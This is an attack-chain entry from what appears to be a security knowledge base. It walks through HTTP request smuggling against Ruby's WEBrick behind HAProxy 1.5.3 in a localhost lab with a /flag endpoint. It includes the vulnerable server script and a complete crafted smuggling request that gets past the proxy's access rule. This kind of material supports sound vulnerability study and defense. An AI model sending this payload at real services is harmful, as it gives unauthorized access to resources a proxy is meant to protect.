---
tags:
  - http-smuggling
  - webrick
  - ruby
  - haproxy
  - bypass
type: attack_chain
tools:
  - '[[tools/HAProxy]]'
  - '[[tools/WEBrick]]'
tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
commands:
  - '[[commands/webrick-server-setup]]'
  - '[[commands/http-smuggling-request]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Configure-HAProxy-Access-Restrictions]]'
  - '[[procedures/Set-Up-Vulnerable-WEBrick-Server]]'
  - '[[procedures/Exploit-HTTP-Request-Smuggling]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploits a vulnerability in Ruby's WEBrick HTTP server to perform HTTP Request
  Smuggling, bypassing HAProxy access restrictions to reach forbidden endpoints.
skill_level: intermediate
impact_level: high
id: 80f83a38-47f3-47ad-a4ae-ac5509e1b946
created_at: '2025-12-13T09:01:22.233Z'
updated_at: '2025-12-13T09:01:22.233Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling in WEBrick to Bypass HAProxy Restrictions

Multi-stage attack chain demonstrating HTTP Request Smuggling exploitation in Ruby's WEBrick server via a loose Transfer-Encoding header check, allowing bypass of HAProxy restrictions to access unauthorized endpoints like /flag.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Configure Proxy Restrictions] --> B[Set Up Vulnerable Server]
    B --> C[Exploit Smuggling to Bypass]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/HAProxy]]
- [[tools/WEBrick]]

### Target Environment

- Platform: Web
- Required services/ports: HAProxy on port 80, WEBrick on port 8080
- Network access requirements: Localhost access for testing

### Initial Access Requirements

- No credentials required
- Network position: Access to HAProxy frontend
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Configure HAProxy Restrictions
procedure: [[procedures/Configure-HAProxy-Access-Restrictions]]

**Objective**: Set up HAProxy as a proxy to restrict access to specific URIs like /flag.

**Instructions**: Configure HAProxy version 1.5.3 with a configuration file that uses ACL to deny requests starting with /flag. Start HAProxy with the config to enforce restrictions on incoming requests.

**Expected Output**: HAProxy running and blocking access to /flag.

**Success Indicators**:
- HAProxy starts without errors
- Direct requests to /flag are denied

### Step 2: Set Up Vulnerable WEBrick Server
procedure: [[procedures/Set-Up-Vulnerable-WEBrick-Server]]

**Objective**: Deploy a WEBrick HTTP server with exposed endpoints to demonstrate the vulnerability.

**Instructions**: Create and run the Ruby script using [[commands/webrick-server-setup]] to start the server on port 8080 with '/' and '/flag' endpoints.

```ruby
#!/usr/bin/env ruby
require 'webrick'
server = WEBrick::HTTPServer.new(:Port => 8080)
server.mount_proc '/' do |req, res|
  res.body = 'hello world'
end
server.mount_proc '/flag' do |req, res|
  res.body = 'flag is 123456'
end
server.start
```

**Expected Output**: WEBrick server listening on port 8080.

**Success Indicators**:
- Server starts successfully
- Endpoints respond to direct requests

### Step 3: Exploit HTTP Request Smuggling
procedure: [[procedures/Exploit-HTTP-Request-Smuggling]]

**Objective**: Craft and send a smuggling request to bypass HAProxy and access the forbidden /flag endpoint.

**Instructions**: Send the crafted HTTP request using [[commands/http-smuggling-request]] to exploit the loose regex in WEBrick's Transfer-Encoding parsing.

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: AAA chunked BBB
Connection: keep-alive
Content-Length: 50

71
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1

```

**Expected Output**: Response from /flag endpoint, e.g., 'flag is 123456'.

**Success Indicators**:
- Smuggled request bypasses HAProxy
- Unauthorized access to /flag achieved

## Attack Chain Summary

### Key Achievements

1. Configured proxy restrictions bypassed
2. Exploited WEBrick vulnerability for smuggling
3. Gained unauthorized access to restricted resources

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Defense Evasion]]

*Last updated: [TIMESTAMP]*
